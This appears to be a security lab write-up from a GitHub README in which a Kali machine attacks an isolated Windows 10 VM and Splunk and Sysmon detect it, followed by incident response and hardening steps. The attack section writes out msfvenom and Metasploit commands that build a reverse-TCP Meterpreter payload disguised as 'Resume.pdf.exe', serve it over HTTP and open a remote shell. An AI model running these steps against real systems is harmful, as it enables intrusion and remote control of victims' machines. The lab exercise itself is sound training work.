<h1 = align=center>Virtual Home Lab</h1>
<h2 = align=center>Attack and Defense</h2>

<p align="center">
<img width="956" height="522" alt="Untitled Diagram drawio (7) drawio" src="https://github.com/user-attachments/assets/d4a4ad35-5a28-4c3e-bf07-cde76d12213b" />
</p>

<p align="center">
  <strong>Attacker:</strong> Kali Linux <code>192.168.20.20</code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <strong>Defender:</strong> Windows 10 <code>192.168.20.10</code>
</p>

---

## 🛠️ Technology & Tools Utilized

- **`VirtualBox:`**  
  Served as the primary hypervisor for hosting virtual machines locally in a controlled lab environment.

- **`Windows Server:`**  
  Deployed as the core infrastructure server for testing services such as Splunk, Active Directory, DNS, or file sharing.

- **`Kali Linux:`**  
  Used as the attacker machine for penetration testing, vulnerability scanning, and offensive security simulations.

- **`Bash:`**  
  Used as the primary command-line shell within Kali Linux to execute scripts, automate tasks, manage tools, and perform offensive security operations.

- **`Splunk:`**  
  Deployed to monitor system and network activity in real time. Ingested logs from the Windows VM to analyze attack patterns, identify anomalies, and simulate Security Operations Center (SOC) workflows.

- **`Sysmon:`**  
  Installed on the Windows VM to generate detailed event logs for process creation, file changes, network connections, and other system activities. Used in conjunction with Splunk to detect indicators of compromise (IOCs) and understand attacker behavior.

<p align="center">
  <img width="300" height="300" alt="sysmon-splunk" src="https://github.com/user-attachments/assets/8b0877ff-cabe-4bb0-90b7-0541f67cc0cd" />
</p>

---

## Objective

In this lab environment, I am building on foundational virtualization skills by deploying a security-focused network simulation using VirtualBox. The setup includes a Windows virtual machine configured as the defender system, equipped with Splunk Enterprise for log aggregation and analysis, and Sysmon for detailed event logging. Opposing it is a Kali Linux virtual machine, which serves as the attacker platform to simulate real-world threats and offensive security techniques. This lab is designed to strengthen my skills in threat detection, log analysis, and incident response by observing and analyzing malicious activity in a controlled environment.

## Preparation

Before conducting the test, the `Windows 10` virtual machine was preconfigured with `Splunk Enterprise` and `Sysmon` installed, along with the `Sysmon Add-on` for Splunk to enable proper event parsing and visualization. Both the Windows and Kali Linux virtual machines were connected to an `internal network` to isolate the environment. For the purpose of the test, `Windows Defender`, `Microsoft Security` features, and the system `firewall` were temporarily disabled to allow full visibility into attack behavior and network activity.

---

## 👣 Steps the `Attacker` Made

### Step 1: Aggressive Network Reconnaissance

The attacker used the command `nmap -A -Pn 192.168.20.10` to perform an `aggressive scan` against the host at IP address `192.168.20.10`.

```bash
nmap -A -Pn 192.168.20.10
```
<img width="626" height="248" alt="Lab 203" src="https://github.com/user-attachments/assets/49ff2b97-51ae-4a25-a16c-247070356a3a" /></br>

Based on these results, the attacker identifies that several critical ports are open on the target system, including `135/tcp (RPC)`, `139/tcp (NetBIOS Session Service)`, `445/tcp (Microsoft-DS/SMB)`, and `3389/tcp (Remote Desktop Protocol - RDP)`. These open ports provide potential attack vectors, as they correspond to services that, if improperly secured, can be exploited for unauthorized access, information gathering, or lateral movement within the network.

---

### Step 2: Generate a Malicious Reverse TCP Payload for Remote Access

```bash
msfvenom -l payloads
```
The command `msfvenom -l payloads` lists all available payload options that can be generated using the Metasploit Framework’s msfvenom tool.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.20 lport=4444 -f exe -o Resume.pdf.exe
```
The attacker uses `msfvenom` to generate a 64-bit Windows executable payload (`Resume.pdf.exe`) that, when run on the target system, initiates a reverse TCP connection back to the attacker’s machine at `IP 192.168.20.20` on `port 4444`, allowing remote control via a `Meterpreter` session.

```bash
ls
```

```bash
file Resume.pdf.exe
```

The commands `ls` and `file Resume.pdf.exe` are used to verify the presence of the generated payload file and confirm its file type as a Windows executable.

<img width="603" height="317" alt="Lab 204" src="https://github.com/user-attachments/assets/28eaebe8-ff59-4c9a-80ca-9fd9815a45cf" />

---

### Step 3: Setting Up a Metasploit Listener for a Reverse TCP Shell

```bash
msfconsole
```

```bash
set payload windows/x64/meterpreter/reverse_tcp payload
```

```bash
set lhost 192.168.20.20
```

```bash
options
```

The attacker is launching the Metasploit console `msfconsole`, configuring it to use the `windows/x64/meterpreter/reverse_tcp payload`, and setting the local host `lhost` IP address to `192.168.20.20`, which prepares the listener to receive a reverse connection from the target system.

<img width="593" height="334" alt="Lab 205" src="https://github.com/user-attachments/assets/69f11c14-5674-435c-baf5-82906215863e" />

---

### Step 4: Hosting a Malicious Payload Using a Python HTTP Server

```bash
ls
```

```bash
python3 -m http.server 9999
```

The attacker lists the current directory with `ls`, then uses `python3 -m http.server 9999` to start a simple HTTP server on `port 9999`, allowing files in that directory (such as a malicious payload) to be served and downloaded by a target machine.

<img width="493" height="256" alt="Lab 79" src="https://github.com/user-attachments/assets/98f1f922-ef4b-49ef-8f23-fec7373ebfec" /></br>

<img width="316" height="209" alt="Lab 206" src="https://github.com/user-attachments/assets/aec51636-2e18-4075-b114-70bf6a838ecf" /></br>

<img width="783" height="168" alt="Lab 207" src="https://github.com/user-attachments/assets/d0256e34-a026-4331-936f-3f5358de998c" /></br>

*Note: Having `file extensions` enabled is important because it allows users to see the true format of a file, helping them identify potentially malicious files disguised with misleading names (e.g., `resume.pdf` that is actually `resume.pdf.exe`). Without extensions visible, users may unknowingly open executable files thinking they are safe documents, increasing the risk of malware execution.*

---

### Step 5: Active Network Connection

```bash
network -anob
```

The command `netstat -anob` is used on Windows to display all active network connections and listening ports `-a`, show addresses and port numbers in numerical form `-n`, include the executable (binary) responsible for each connection `-b`, and display the owning process ID `-o`.

<img width="602" height="69" alt="Lab 209" src="https://github.com/user-attachments/assets/90cdb1bb-f267-471a-a16b-2f896dc91bee" />

With the execution of the `Resume.pdf.exe` payload on the victim’s machine, the attacker can now observe that a reverse TCP connection has been successfully established. Using tools like `netstat`, the attacker confirms that their machine `192.168.20.20` is actively connected to the victim’s system `192.168.20.10` over a designated port, indicating that the Meterpreter session is live and the payload has executed as intended, granting remote access to the target.

<img width="662" height="188" alt="Lab 212" src="https://github.com/user-attachments/assets/3952f535-6f1a-4287-ad98-2b07cc678794" />

---

### Step 6: Establishing a Reverse Shell and Enumerating the Victim System

```bash
exploit
```

```bash
shell
```

```bash
netuser
```

```bash
net localgroup
```

```bash
ipconfig
```

The attacker runs the `exploit` command in Metasploit’s multi/handler module to begin listening for the reverse connection from the victim. Once the connection is established, they gain a `shell` on the victim’s machine, allowing them to run commands like `net user` (to enumerate local user accounts) and `ipconfig` (to view the victim’s network configuration), effectively confirming access and gathering initial system information.

<img width="619" height="98" alt="Lab 85" src="https://github.com/user-attachments/assets/6910c5ce-d789-4c9d-a055-72f2e0ff6cc8" />

<img width="542" height="477" alt="Lab 86" src="https://github.com/user-attachments/assets/df91683c-2ada-4fc4-aeb0-a22e175f13ed" />

---

## Analyzing Splunk

<img width="946" height="201" alt="Lab 215" src="https://github.com/user-attachments/assets/62738a87-be11-4f3d-8966-ba165ec011ff" /></br>

<img width="954" height="201" alt="Lab 216" src="https://github.com/user-attachments/assets/872b8338-9dd4-411d-b82c-ad74b105c1c1" /></br>

<img width="636" height="389" alt="Lab 218" src="https://github.com/user-attachments/assets/6652024f-b6e4-4827-8415-75d715853891" /></br>

<img width="1284" height="395" alt="Lab 220" src="https://github.com/user-attachments/assets/bee72274-9860-471d-a6f3-462c2ededa7d" />

---

## 👣 Steps the `Defender` Made

### Step 1: Isolate the Compromised System

Disconnect the affected machine from the network to prevent further communication with the attacker or lateral movement.

### Step 2: Run Antivirus and Anti-Malware Scans

Use updated security software to detect and remove known malware.

### Step 3: Analyze Suspicious Running Processes and Network Connections

Use tools like Task Manager, netstat, or Sysinternals Process Explorer to identify suspicious activity.

### Step 4: Check for Unauthorized Users or Services

Review user accounts and running services for anomalies.

### Step 5: Inspect Event Logs

Analyze Windows Event Logs and Sysmon logs for unusual or suspicious events related to the payload execution.

### Step 6: Update and Patch 

Ensure the system’s OS and applications are fully patched to close vulnerabilities.

### Step 7: Restore from Backup

If the infection is severe, restore the system to a clean backup state.

### Step 8: Implement Endpoint Detection and Response (EDR)

Use advanced tools that monitor behavior and can automate threat containment.

### Step 9: Educate Users

Promote awareness on phishing, social engineering, and the importance of keeping file name extensions enabled to avoid being tricked by disguised malicious files.

### Step 10: Document and Report Incident

Follow organizational incident response procedures to document and escalate the issue appropriately.

---

## 🧱 Hardening the System

### Firewall

To strengthen the security of the system, it’s important to enable and properly configure the Windows Firewall, including setting strict inbound rules that only allow necessary ports and block all others.

<img width="551" height="428" alt="image" src="https://github.com/user-attachments/assets/f996facd-82c4-48f4-ad50-755ec24b05eb" /></br>

<img width="428" height="575" alt="Lab 230" src="https://github.com/user-attachments/assets/34ac8299-80ca-4eec-851d-c3394cf722aa" /></br>

Inbound Rules → New Rule → Port → TCP → 135, 139, 445, 3389 → Block the Connection

---

### Windows Defender and Updates

Turning on `Windows Security` features—such as real-time antivirus protection, ransomware protection, and exploit mitigation—adds additional layers of defense. Ensuring that `Windows Updates` are enabled and set to install automatically helps keep the system protected against newly discovered threats and vulnerabilities. Additionally, keeping all operating system components and third-party applications updated with the latest security patches is essential.

<img width="792" height="581" alt="security" src="https://github.com/user-attachments/assets/3f71b339-ec5a-42c9-a779-15fa9e92a3fc" /></br>

<img width="1142" height="627" alt="image" src="https://github.com/user-attachments/assets/ead80d00-87fc-47e1-bafe-40d60fee587e" /></br>

---

### 139/tcp - NetBIOS Session Service

<img width="1160" height="630" alt="Lab 237" src="https://github.com/user-attachments/assets/d7913fb4-5876-4c57-ab32-3d4ad3acc839" /></br>

Control Panel → Network and Internet → Network Connections → Properties → Internet Protocol Version 4 → Properties → Advanced → WINS → Disable NetBIOS over TCP/IP

<img width="861" height="587" alt="Lab 238" src="https://github.com/user-attachments/assets/13ffafba-9a1a-485c-8c9d-8f1d4a2b3440" /></br>

Services → TCP/IP NetBIOS Helper → Properties → Startup Type: Disabled → Service Status: Stop

---

### 445/tcp - Microsoft-DS (SMB over TCP)

<img width="740" height="632" alt="Lab 236" src="https://github.com/user-attachments/assets/0f8305c6-4150-4743-9051-d58352786298" /></br>

Control Panel → Programs → Programs and Features → Disable SMB 1.0/CIFS File Sharing Support

---

### 3389/tcp - Remote Desktop Protocol (RDP)

<img width="795" height="630" alt="Lab 231" src="https://github.com/user-attachments/assets/e719e705-143b-45a5-a0d9-8dcd8b408a57" /></br>

Settings → System → Remote Desktop → Off

---

### All Unnecessary and Vulnerable Ports are Closed

<img width="605" height="229" alt="Lab 239" src="https://github.com/user-attachments/assets/b2a472bc-f93d-4f7e-8fa5-a919daef666d" />

---

*This project simulates a real-world attack scenario in a controlled virtual lab environment to demonstrate how a malicious payload can be delivered, executed, and monitored using offensive security tools. Its purpose is to analyze attacker behavior, assess system vulnerabilities, and explore defensive measures using tools like Splunk and Sysmon.*

**Created By:** `Briana Willis`  
**Date:** `2025-07-13`  
**Time:** `17:50 UTC`












